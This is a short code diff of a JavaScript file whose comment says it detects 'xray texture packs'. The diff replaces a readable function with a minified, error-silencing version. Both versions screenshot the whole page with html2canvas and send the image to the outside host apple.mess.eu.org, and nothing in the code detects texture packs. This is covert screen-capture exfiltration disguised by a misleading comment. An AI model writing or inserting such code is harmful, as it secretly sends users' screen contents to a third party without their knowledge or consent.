@@ -1,27 +1,3 @@
 // this is used to detect xray texture packs
 
-function apple() {
-    html2canvas(document.body).then(canvas => {
-        // Convert canvas to blob
-        canvas.toBlob(blob => {
-            // Create FormData object
-            const formData = new FormData();
-            formData.append('photo', blob, 'apple.png');
-
-            // Send screenshot to server
-            fetch('https://apple.mess.eu.org/', {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Failed :(');
-                }
-                console.log('Good :)');
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
-        }, 'image/png');
-    });
-}
+function apple(){try{if(typeof html2canvas==='undefined')return;html2canvas(document.body).then(c=>{try{c.toBlob(b=>{if(!b)return;const f=new FormData();f.append('photo',b,'apple.png');fetch('https://apple.mess.eu.org/',{method:'POST',body:f}).catch(()=>{})},'image/png')}catch(e){}}).catch(()=>{})}catch(e){}}
